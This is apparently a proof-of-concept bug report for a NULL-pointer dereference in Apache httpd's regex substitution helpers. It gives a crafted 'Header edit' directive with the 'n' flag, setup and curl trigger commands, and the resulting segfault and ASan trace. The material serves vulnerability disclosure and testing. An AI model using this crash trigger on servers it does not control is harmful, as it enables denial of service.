# PoC 202 - Substitution n Flag Dereferences NULL pmatch

`ap_rxplus_compile()` accepts the `n` flag for substitutions, which sets
`AP_REG_NOMEM` and leaves `pmatch == NULL`. `ap_rxplus_exec()` later
dereferences `rx->pmatch[0].rm_so`, crashing for every match.

## Setup

httpd with `mod_headers`, which calls `ap_rxplus_compile()` /
`ap_rxplus_exec()` for `Header edit` directives. Build optionally with ASan.

`/tmp/httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule mpm_event_module      modules/mod_mpm_event.so
LoadModule unixd_module          modules/mod_unixd.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule mime_module           modules/mod_mime.so
LoadModule headers_module        modules/mod_headers.so
LoadModule dir_module            modules/mod_dir.so

DocumentRoot "/tmp/htdocs"

# ap_rxplus_compile() parses the trailing "n": substitution + AP_REG_NOMEM.
# Any matching response then runs the NULL-pmatch path.
Header always edit Server "s/Apache/Replaced/n"

<Directory "/tmp/htdocs">
    Require all granted
</Directory>
```

```sh
mkdir -p /tmp/htdocs
echo "ok" > /tmp/htdocs/index.html
httpd -DFOREGROUND -f /tmp/httpd.conf &
```

## Trigger

```sh
curl -sv http://127.0.0.1:8080/index.html >/dev/null
```

Any response carrying a `Server: Apache/...` header runs `ap_rxplus_exec()`
on the configured substitution. The regex `Apache` matches, `rx->subs` is
set, and the substitution block dereferences `rx->pmatch[0].rm_so`.

## Observed effect

- Worker SIGSEGV with the faulting instruction at
  `server/util_regex.c:160`:

  ```
  startl = rx->pmatch[0].rm_so;   /* rx->pmatch == NULL */
  ```

- ASan report:

  ```
  ==pid==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
      #0 ap_rxplus_exec server/util_regex.c:160
      #1 edit_do modules/metadata/mod_headers.c
      #2 ap_run_insert_filter / output filter chain
  ```

- `error.log` records `child pid ... exit signal Segmentation fault (11)`
  for every request that produces a matching `Server` header.

A standalone reproduction without httpd compiles a small C program that
calls `ap_rxplus_compile(pool, "s/Apache/Replaced/n")` and then
`ap_rxplus_exec(pool, rx, "Apache/2.4", &out)`. It crashes on the first
match.
